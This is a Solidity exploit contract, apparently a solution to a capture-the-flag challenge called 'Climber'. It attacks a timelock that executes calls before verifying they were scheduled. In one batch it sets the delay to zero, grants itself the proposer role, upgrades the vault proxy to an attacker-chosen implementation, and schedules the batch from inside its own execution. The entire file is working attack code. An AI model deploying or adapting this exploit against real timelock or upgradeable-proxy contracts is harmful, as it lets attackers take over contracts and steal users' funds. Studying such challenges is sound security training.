// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "@openzepel"
import "./ClimberTimelock.sol";
import "hardhat/console.sol";

contract AttackerClimber {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    ClimberTimelock public timelock;
    address public vaultAddress; 
    address public implementationV2;

    constructor(address payable timelockAddress, address _vaultAddress, address _implementationV2) {
        timelock = ClimberTimelock(timelockAddress);
        vaultAddress = _vaultAddress;
        implementationV2 = _implementationV2;
    }

    function parameters() public view returns (
        address[] memory targets, 
        uint256[] memory values,
        bytes[] memory dataElements,
        bytes32 salt
    ) {
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);
        salt = bytes32(keccak256("ORE"));

        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature(
            "updateDelay(uint64)", 
            0
        );

        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        targets[2] = vaultAddress;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature(
            "upgradeTo(address)",
            implementationV2
        );

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature(
            "scheduleTimelock()"
        );
    }
        
    function attack() external {
        address[] memory targets; 
        uint256[] memory values; 
        bytes[] memory dataElements; 
        bytes32 salt;
        (targets, values, dataElements, salt) = parameters();

        timelock.execute(
            targets,
            values,
            dataElements,
            salt
        );
    }

    function scheduleTimelock() external {
        address[] memory targets; 
        uint256[] memory values; 
        bytes[] memory dataElements; 
        bytes32 salt;
        (targets, values, dataElements, salt) = parameters();

        timelock.schedule(  
            targets,
            values,
            dataElements,
            salt
        );
    }
}